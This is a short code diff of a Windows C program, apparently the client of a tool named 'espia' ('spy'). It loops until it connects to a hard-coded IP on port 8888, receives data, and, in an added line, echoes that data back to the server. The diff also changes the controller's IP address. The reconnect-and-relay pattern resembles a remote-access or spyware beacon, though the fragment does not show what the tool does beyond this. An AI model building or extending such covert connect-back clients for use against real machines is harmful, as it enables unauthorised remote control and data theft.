@@ -23,7 +23,7 @@ int main() {
 
     /* Keep trying to connect to the server */
 	WORD server_status;
-	while ((server_status = espia_connect("172.20.139.115", "8888")) == CONNECTION_FAIL)
+	while ((server_status = espia_connect("172.25.130.35", "8888")) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
     /* ------------------------------------ */
 
@@ -118,6 +118,7 @@ int main() {
             continue;
         } else {
             printf("%s : %d\n", recv_buff, cmd_size);
+            espia_send((PWSTR)recv_buff, cmd_size);
         }
 
         WCHAR msg_end[6];
